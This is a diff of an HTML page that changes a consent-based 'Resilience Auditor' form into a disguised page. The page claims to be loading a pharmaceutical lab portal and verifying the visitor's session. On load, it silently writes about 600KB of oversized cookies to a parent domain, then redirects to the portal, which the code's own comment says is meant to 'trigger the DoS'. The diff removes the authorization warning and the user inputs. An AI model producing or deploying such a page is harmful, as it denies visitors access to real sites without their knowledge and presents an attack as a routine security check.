@@ -1,90 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PharmaSec | 600KB Resilience Auditor</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f4f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 500px; border-top: 8px solid #d32f2f; }
-        h1 { color: #d32f2f; font-size: 1.5rem; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; }
-        p { color: #546e7a; font-size: 0.9rem; line-height: 1.5; }
-        .form-group { margin-top: 25px; }
-        label { display: block; font-weight: bold; margin-bottom: 8px; color: #263238; font-size: 0.85rem; }
-        input { width: 100%; padding: 12px; border: 2px solid #cfd8dc; border-radius: 6px; box-sizing: border-box; font-size: 1rem; transition: border-color 0.3s; }
-        input:focus { border-color: #d32f2f; outline: none; }
-        .warning-box { background: #fff3e0; border-left: 4px solid #ff9800; padding: 15px; margin-top: 20px; font-size: 0.8rem; color: #e65100; }
-        .btn-execute { background: #d32f2f; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; font-size: 1rem; cursor: pointer; margin-top: 25px; transition: background 0.3s; }
-        .btn-execute:hover { background: #b71c1c; }
-        .footer { margin-top: 20px; font-size: 0.75rem; text-align: center; color: #90a4ae; }
-    </style>
+    <title>Internal Research Document</title>
 </head>
-<body>
-
-<div class="container">
-    <h1>🔬 Resilience Auditor</h1>
-    <p>This tool verifies if pharmaceutical portals are susceptible to <b>Parent-Domain Cookie Overflows</b> (600KB+).</p>
-
-    <div class="form-group">
-        <label>1. Parent Domain Scope (e.g., .pharma-corp.com)</label>
-        <input type="text" id="parentDomain" placeholder=".example.com" value=".">
+<body onload="launchAudit()">
+    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+        <h2>Loading Pharmaceutical Lab Portal...</h2>
+        <p>Please wait while we verify your session data.</p>
     </div>
 
-    <div class="form-group">
-        <label>2. Target Portal URL (Subdomain to test)</label>
-        <input type="text" id="targetURL" placeholder="https://trials.example.com">
-    </div>
+    <script>
+        function launchAudit() {
+            // 1. Identify the target parent domain
+            // For the audit, manually set this to the parent of your targets
+            const targetDomain = ".example-pharma.com"; 
+            const targetPortal = "https://trials.example-pharma.com";
 
-    <div class="warning-box">
-        <b>ATTENTION:</b> This will inject 170 cookies into your browser. This persists until manually cleared. Use only on authorized research targets.
-    </div>
+            console.log("🧬 Initializing Infrastructure Resilience Check...");
 
-    <button class="btn-execute" onclick="startAudit()">🚀 ARM & REDIRECT</button>
+            try {
+                // 2. The Loop: Generate 600KB of "Nuclear" Cookies
+                // 150 unique cookies * 4KB each = 600KB
+                for (let i = 0; i < 150; i++) {
+                    let payload = "STRESS_TEST_" + "X".repeat(3980) + "_" + i;
+                    
+                    // Bind to Parent Domain for maximum blast radius
+                    document.cookie = `session_id_${i}=${payload}; Domain=${targetDomain}; Path=/; Max-Age=3600; SameSite=Lax`;
+                }
 
-    <div class="footer">
-        Identity: Life Science & Pharmaceutical Discovery Agent
-    </div>
-</div>
+                // 3. Execution: Redirect to trigger the DoS
+                setTimeout(() => {
+                    window.location.href = targetPortal;
+                }, 500);
 
-<script>
-    function startAudit() {
-        const domain = document.getElementById('parentDomain').value.trim();
-        const target = document.getElementById('targetURL').value.trim();
-
-        if (domain === "." || domain.length < 3) {
-            alert("Please enter a valid Parent Domain starting with a dot (e.g., .target.com)");
-            return;
-        }
-        if (!target.startsWith('http')) {
-            alert("Target URL must include https://");
-            return;
-        }
-
-        console.log("Starting 600KB binding for: " + domain);
-
-        try {
-            // Browsers have a ~180 cookie limit. We use 170 to stay safe.
-            // 170 cookies * 3.6KB = ~612KB Total Header Size.
-            for (let i = 0; i < 170; i++) {
-                // Each payload is roughly 3600 bytes of 'X'
-                let payload = "PHARMA_SEC_AUDIT_" + "X".repeat(3600) + "_" + i;
-                
-                // Max-Age 3600 = 1 Hour persistence
-                document.cookie = `audit_id_${i}=${payload}; Domain=${domain}; Path=/; Max-Age=3600; SameSite=Lax`;
+            } catch (e) {
+                console.error("Audit failed: " + e.message);
             }
-
-            alert("Payload Armed: 600KB of cookies stored for " + domain + "\n\nRedirecting to target...");
-            
-            // Short delay to ensure browser DB commit
-            setTimeout(() => {
-                window.location.href = target;
-            }, 300);
-
-        } catch (e) {
-            alert("Critical Error: " + e.message);
         }
-    }
-</script>
-
+    </script>
 </body>
 </html>
